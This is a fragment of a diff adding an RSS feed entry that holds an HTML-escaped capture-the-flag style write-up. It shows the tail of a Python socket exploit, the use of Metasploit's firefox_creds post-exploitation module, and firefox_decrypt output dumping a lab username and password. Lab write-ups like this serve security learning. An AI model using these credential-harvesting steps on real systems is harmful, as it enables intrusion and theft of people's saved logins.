+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.send&lt;span class="o">(&lt;/span>bytes&lt;span class="o">(&lt;/span>buffer + &lt;span class="s2">&amp;#34;\r\n&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;latin-1&amp;#34;&lt;/span>&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Done!&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After gaining initial access and wondering around a bit I noticed that the only possible thing to do would be getting credentials from Firefox, I used the metasploit tool &lt;code>post/multi/gather/firefox_creds&lt;/code>&lt;/p>
+&lt;p>After that I ran firefox_decrypt and got the username and password:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 firefox_decrypt.py firefox/loot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-01-03 10:00:37,134 - WARNING - profile.ini not found in firefox/loot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-01-03 10:00:37,134 - WARNING - Continuing and assuming &lt;span class="s1">&amp;#39;firefox/loot&amp;#39;&lt;/span> is a profile location
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Website: https://creds.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Username: &lt;span class="s1">&amp;#39;mayor&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: &lt;span class="s1">&amp;#39;8CL7O1N78MdrCIsV&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
